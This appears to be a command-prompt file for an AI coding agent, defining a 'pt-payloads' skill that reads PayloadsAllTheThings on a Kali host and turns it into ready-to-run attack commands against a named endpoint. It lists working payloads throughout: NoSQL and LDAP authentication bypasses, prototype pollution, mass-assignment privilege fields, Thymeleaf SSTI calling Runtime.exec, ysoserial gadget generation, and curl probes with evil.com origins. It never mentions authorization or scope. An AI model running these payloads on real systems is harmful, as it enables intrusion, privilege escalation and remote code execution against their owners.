---
description: Targeted payload generator — maps tech stack + input type to PayloadsAllTheThings, reads actual Kali PAT files, produces exact ready-to-run test commands
argument-hint: <tech stack, input type, endpoint>
allowed-tools: [mcp__kali-pentest__execute_kali_command]
---

# pt-payloads — Manual Payload Tester

You are generating a targeted payload test plan for a specific tech stack, input type, and endpoint. Read the actual PayloadsAllTheThings files from Kali, extract the most effective payloads for the given context, and wrap them in ready-to-run commands.

**Do not generate generic payloads from memory. Always read the PAT files from Kali and use those as the source of truth.**

---

## Step 0 — Parse Input & Check PAT

`$ARGUMENTS` contains: `<tech stack, input type, endpoint>` as freeform text.

Extract:
- **Tech stack**: frameworks, languages, template engines (e.g., Spring Boot, Thymeleaf, Django, PHP, Node.js)
- **Input type**: JSON body / query param / XML / file upload / header / multipart / path param
- **Endpoint**: the specific path being tested (e.g., `/api/v1/render`)

First, check what PAT categories are available on Kali:

```bash
ls /home/kali/PayloadsAllTheThings/ | sort
```

Based on the tech stack and input type, identify which PAT directories are relevant. Then read the relevant files in Step 1.

---

## Step 1 — Read PAT Files (always do this before generating payloads)

Based on the identified attack categories, read the relevant PAT content. Only read what's relevant — do not read everything.

### SSTI payloads
Triggered by: template engine in tech stack (Jinja2, Thymeleaf, Twig, Freemarker, Pebble, Velocity, Smarty, Mako, Nunjucks)

```bash
ls "/home/kali/PayloadsAllTheThings/Server Side Template Injection/"
```
Then read the engine-specific file:
```bash
# For Jinja2 / Python
cat "/home/kali/PayloadsAllTheThings/Server Side Template Injection/README.md" | grep -A5 -B1 "Jinja2\|Python\|Flask\|Django" | head -60

# For Java (Thymeleaf / Freemarker / Velocity / Pebble)
cat "/home/kali/PayloadsAllTheThings/Server Side Template Injection/README.md" | grep -A5 -B1 "Thymeleaf\|FreeMarker\|Velocity\|Java\|Spring\|Pebble" | head -60

# For PHP (Twig / Smarty)
cat "/home/kali/PayloadsAllTheThings/Server Side Template Injection/README.md" | grep -A5 -B1 "Twig\|Smarty\|PHP" | head -60
```

### SQL Injection payloads
Triggered by: any search/filter/query/id parameter, any input that hits a database

```bash
ls "/home/kali/PayloadsAllTheThings/SQL Injection/"
cat "/home/kali/PayloadsAllTheThings/SQL Injection/README.md" | head -80
```
Also check DBMS-specific file if DB is known (MySQL, MSSQL, PostgreSQL, Oracle, SQLite):
```bash
# Example for MySQL
cat "/home/kali/PayloadsAllTheThings/SQL Injection/MySQL Injection.md" | head -60
```

### LFI / Path Traversal payloads
Triggered by: `file=`, `path=`, `page=`, `include=`, `template=` parameter; PHP stack

```bash
ls "/home/kali/PayloadsAllTheThings/File Inclusion/"
cat "/home/kali/PayloadsAllTheThings/File Inclusion/README.md" | head -80
```

### SSRF payloads
Triggered by: `url=`, `webhook=`, `callback=`, `redirect=`, `fetch=`, `src=` parameter

```bash
cat "/home/kali/PayloadsAllTheThings/Server Side Request Forgery/README.md" | head -60
```

### XXE payloads
Triggered by: XML input, `Content-Type: application/xml`, SOAP, file upload (SVG/DOCX/XLSX)

```bash
ls "/home/kali/PayloadsAllTheThings/XXE Injection/"
cat "/home/kali/PayloadsAllTheThings/XXE Injection/README.md" | head -80
```

### Command Injection payloads
Triggered by: command-executing parameters, shell-passing inputs, ping/traceroute/nslookup-type endpoints

```bash
ls "/home/kali/PayloadsAllTheThings/Command Injection/"
cat "/home/kali/PayloadsAllTheThings/Command Injection/README.md" | head -60
```

### File Upload payloads
Triggered by: file upload endpoint, `multipart/form-data`

```bash
ls "/home/kali/PayloadsAllTheThings/Upload Insecure Files/"
cat "/home/kali/PayloadsAllTheThings/Upload Insecure Files/README.md" | head -60
```

### Open Redirect payloads
Triggered by: `redirect=`, `next=`, `return=`, `url=` parameters that control post-auth redirect

```bash
cat "/home/kali/PayloadsAllTheThings/Open Redirect/README.md" | head -40
```

### Mass Assignment payloads
Triggered by: JSON body on any POST/PUT/PATCH endpoint; any framework (Rails, Django, Spring, Laravel, Express)

No PAT file needed — generate from CLAUDE.md knowledge:
```
Extra fields to inject into the request body:
"admin": true
"role": "admin"
"is_admin": 1
"is_superuser": true
"permissions": ["admin", "superuser", "write"]
"user_type": "admin"
"verified": true
"approved": true
"balance": 99999
"credits": 99999
```

### NoSQL Injection payloads
Triggered by: MongoDB/CouchDB/Firebase signals, `$` operator behavior, JSON login body, filter/search params

```bash
ls "/home/kali/PayloadsAllTheThings/NoSQL Injection/" 2>/dev/null || ls /home/kali/PayloadsAllTheThings/ | grep -i nosql
cat "/home/kali/PayloadsAllTheThings/NoSQL Injection/README.md" 2>/dev/null | head -80
```

Key patterns — generate these curl commands:
```
# Auth bypass — MongoDB operator injection
{"email":{"$gt":""},"password":{"$gt":""}}
{"email":{"$ne":null},"password":{"$ne":null}}
{"email":"admin@target.com","password":{"$ne":"wrong"}}
{"email":{"$regex":"^admin"},"password":{"$gt":""}}

# URL-form encoded version
email[$gt]=&password[$gt]=&submit=Login
login[$regex]=.*&pass[$regex]=.*

# Timing-based blind (MongoDB $where)
{"filter":{"$where":"sleep(3000)"}}
{"search":{"$where":"function(){var x=new Date(); while((new Date())-x<3000){} return true;}"}}
```

### Prototype Pollution payloads
Triggered by: Node.js/JavaScript backend, JSON body on any endpoint, lodash/merge/extend library signals in JS

```bash
cat "/home/kali/PayloadsAllTheThings/Prototype Pollution/README.md" 2>/dev/null | head -60
```

Key patterns — generate these curl commands:
```
# Direct __proto__ injection
{"__proto__":{"admin":true,"role":"admin","isAdmin":true}}

# constructor.prototype path
{"constructor":{"prototype":{"admin":true,"role":"admin"}}}

# Nested merge abuse (hits lodash _.merge, jQuery.extend deep)
{"settings":{"__proto__":{"admin":true}}}

# URL query string
?__proto__[admin]=true&__proto__[role]=admin

# After injection, verify with GET /api/me or /api/profile — check if admin:true appears
```

### LDAP Injection payloads
Triggered by: Active Directory / LDAP authentication, enterprise SSO, ldap:// in error messages, corporate auth stack

```bash
cat "/home/kali/PayloadsAllTheThings/LDAP Injection/README.md" 2>/dev/null | head -60
```

Key patterns:
```
# Auth bypass — inject into username field
username: *)(uid=*))(|(uid=*    → bypasses LDAP filter
username: admin)(&)             → short-circuit filter
username: *)(objectClass=*)     → match all objects
username: *\00                  → null byte in username

# Blind enumeration (timing-based)
username: admin)(|(password=a*  → check if first char is 'a'
```

Curl command:
```bash
curl -sk -X POST "https://$TARGET/api/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"*)(uid=*))(|(uid=*","password":"anything"}' | head -10
```

### Insecure Deserialization payloads
Triggered by: Java application (Spring, Struts), .NET (ViewState), Python (pickle), `Content-Type: application/x-java-serialized-object`, base64 blob in cookies/params starting with `rO0`

```bash
cat "/home/kali/PayloadsAllTheThings/Insecure Deserialization/README.md" 2>/dev/null | head -60
ls /opt/ysoserial* 2>/dev/null || find /opt /home/kali -name "ysoserial*" 2>/dev/null | head -5
```

Detection approach:
```bash
# Java: detect serialized object in parameter (base64 of AC ED 00 05)
# If param starts with rO0AB → Java serialized object

# Out-of-band probe using URLDNS gadget (safe — only DNS lookup, no exec)
# Replace BURP_COLLAB_URL with your Burp Collaborator or interactserver.io URL
java -jar /opt/ysoserial.jar URLDNS "http://BURP_COLLAB_URL" 2>/dev/null | base64 -w0

# Send the base64 payload as the parameter value
curl -sk -X POST "https://$TARGET/$ENDPOINT" \
    -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @<(java -jar /opt/ysoserial.jar URLDNS "http://COLLAB_URL" 2>/dev/null) | head -10

# Python pickle — detect with: response contains __reduce__ error, or pickling in code
# .NET ViewState — check for __VIEWSTATE parameter in form; test with:
curl -sk "https://$TARGET/page.aspx" | grep -i "__VIEWSTATE\|__EVENTVALIDATION" | head -3
```

### CORS Misconfiguration payloads
Triggered by: Cross-origin API requests, AJAX calls visible in traffic, any web app with a REST API

No PAT file needed. Generate these curl commands:
```bash
TARGET=<target>; TOKEN=<token>; ENDPOINT=<endpoint>

# Probe 1: Reflected arbitrary origin
curl -skI "https://$TARGET/$ENDPOINT" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Origin: https://evil.com" 2>/dev/null \
    | grep -i "access-control"

# Probe 2: Null origin (sandbox/file:// bypass)
curl -skI "https://$TARGET/$ENDPOINT" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Origin: null" 2>/dev/null \
    | grep -i "access-control"

# Probe 3: Subdomain takeover angle
curl -skI "https://$TARGET/$ENDPOINT" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Origin: https://evil.$TARGET" 2>/dev/null \
    | grep -i "access-control"

# Probe 4: Pre-domain bypass
curl -skI "https://$TARGET/$ENDPOINT" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Origin: https://evil${TARGET}" 2>/dev/null \
    | grep -i "access-control"

# Interpret result:
# ACAO: * with ACAC: true → Critical (credentialed cross-origin read)
# ACAO: https://evil.com with ACAC: true → Critical (reflected origin)
# ACAO: null with ACAC: true → High (null origin bypass)
```

### Authentication Bypass
Triggered by: login form, token endpoint, any authentication mechanism

```bash
ls "/home/kali/PayloadsAllTheThings/Authentication Bypass/"
cat "/home/kali/PayloadsAllTheThings/Authentication Bypass/README.md" | head -60
```

---

## Step 2 — Generate Targeted Commands

After reading the PAT files, generate the actual test commands. Use the values extracted from PAT — do not use generic placeholder payloads.

**Format for each attack category:**

### Header
```
## [Category Name] — [Tech Stack]
**Why**: [one-line reasoning from the observation]
**PAT source**: /home/kali/PayloadsAllTheThings/[path]
```

### Manual curl tests (first 5-10 highest-signal payloads)
Show exact curl commands with the payload embedded. Use real endpoint from `$ARGUMENTS`.

### Tool automation command
Show the sqlmap/commix/ffuf/wfuzz command for systematic testing.

### Evidence saving
```bash
curl -v ... 2>&1 | tee /home/kali/current/poc/requests/<category>_test.txt
```

---

## Step 3 — Example output format (follow this structure)

When you generate the payload plan, it should look like this:

```
## SSTI — Thymeleaf (Spring Boot)
**Why**: Thymeleaf processes server-side templates; if user input is interpolated into a template expression, arbitrary Java execution is possible.
**PAT source**: /home/kali/PayloadsAllTheThings/Server Side Template Injection/

### Detection probes (run first — check for 49 in response)
curl -sk "https://TARGET/api/render?template=PAYLOAD" -H "Authorization: Bearer TOKEN"

Payloads to test (URL-encode before sending):
  ${7*7}                         → expect 49
  *{7*7}                         → Thymeleaf-specific
  #{7*7}                         → SpEL expression
  ${T(java.lang.Runtime).getRuntime().exec('id')}
  *{T(java.lang.Runtime).getRuntime().exec('id')}

### Automation with wfuzz
wfuzz -c -z file,/tmp/ssti_payloads.txt \
    -H "Authorization: Bearer TOKEN" \
    --filter "content~'49'" \
    "https://TARGET/api/render?template=FUZZ"

### PoC save
curl -v -sk "https://TARGET/api/render?template=%24%7B7*7%7D" \
    -H "Authorization: Bearer TOKEN" 2>&1 | \
    tee /home/kali/current/poc/requests/ssti_thymeleaf.txt
```

---

## Step 4 — Execution checklist

After generating all commands, print a checklist:

```
### Test Checklist
[ ] [Category 1] — manual curl probes
[ ] [Category 1] — automated tool scan
[ ] [Category 2] — manual curl probes
...
[ ] Save all PoC to /home/kali/current/poc/requests/
[ ] Document confirmed findings with /pt
```

---

## Execution rules

- **Always read PAT files first** — never generate payloads purely from memory.
- **Engine-specific payloads only** — if it's Thymeleaf, use Thymeleaf payloads, not generic Jinja2 ones.
- **Start with detection probes** (mathematical expressions like `{{7*7}}`) before RCE payloads.
- **URL-encode payloads** in query params — show both raw and encoded form.
- **Include the full curl command** — never just list payloads without the surrounding command.
- **Limit to 3-4 attack categories maximum** per invocation — don't shotgun everything.
- **If the PAT file doesn't exist**, note it and use the next best available source.
